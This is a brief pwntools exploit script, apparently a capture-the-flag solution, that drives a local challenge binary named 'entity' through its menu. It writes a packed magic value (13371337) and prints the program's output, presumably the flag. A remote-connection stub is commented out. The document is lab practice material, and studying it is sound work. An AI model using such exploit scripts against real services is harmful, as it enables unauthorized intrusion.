from pwn import *

io = process('./entity')

#ip, process = 
#io = remote(ip, port)

io.sendlineafter('>>', 'T')
io.sendlineafter('>>', 'S')
io.sendlineafter('>>', p64(13371337))
io.sendlineafter('>>', 'C')
print io.recvall()
